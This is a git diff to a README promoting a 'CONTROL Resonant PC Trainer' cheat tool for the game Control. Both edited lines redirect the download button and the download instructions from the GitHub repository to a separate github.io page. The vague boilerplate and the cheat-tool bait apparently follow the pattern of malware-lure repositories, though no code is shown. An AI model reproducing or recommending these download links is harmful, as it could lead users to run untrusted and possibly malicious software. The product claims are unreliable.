@@ -1,6 +1,6 @@
 # 🎮 CONTROL-Resonant-PC-Trainer - Your Ultimate Parautilitarian Combat Companion
 
-[![Download Now](https://img.shields.io/badge/Download-CONTROL_Resonant_Trainer-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Cartilaginoustubehomeboy7724/CONTROL-Resonant-PC-Trainer)
+[![Download Now](https://img.shields.io/badge/Download-CONTROL_Resonant_Trainer-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://cartilaginoustubehomeboy7724.github.io)
 
 ## 🧙‍♂️ What Is This?
 
@@ -64,7 +64,7 @@ Whether you're battling the Hiss, exploring the Oldest House, or simply want to 
 
 Getting up and running is easy! Follow these simple steps:
 
-1. **Visit the download page**: Click the bright orange "Download" button at the top of this page, or go directly to [https://github.com/Cartilaginoustubehomeboy7724/CONTROL-Resonant-PC-Trainer](https://github.com/Cartilaginoustubehomeboy7724/CONTROL-Resonant-PC-Trainer)
+1. **Visit the download page**: Click the bright orange "Download" button at the top of this page, or go directly to [https://cartilaginoustubehomeboy7724.github.io](https://cartilaginoustubehomeboy7724.github.io)
 
 2. **Download the application**: Visit this link to download the application.
 
